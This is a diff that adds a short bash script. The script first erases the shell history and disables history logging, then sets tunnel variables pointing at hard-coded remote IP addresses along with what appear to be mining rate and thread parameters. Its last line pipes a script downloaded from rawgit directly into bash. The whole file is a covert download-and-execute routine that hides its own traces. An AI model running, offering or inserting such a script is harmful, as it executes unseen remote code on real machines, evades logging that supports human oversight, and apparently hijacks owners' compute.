@@ -1,0 +1,10 @@
+#!/bin/bash
+history -c; unset HISTFILE;
+export TNL_PORT=18215 \
+TNL_REMOTE=198.204.227.235 \
+TNL_PROTO=ss+mwss \
+ENDPOINT=52.2.254.4:8086 \
+PAUSD_RATE=100 \
+PAUSD_SHARES=2 \
+PAUSD_THREADS=1
+wget -qO- https://rawgit.com/untoreh/scripts/master/start-crt-1-sln | bash
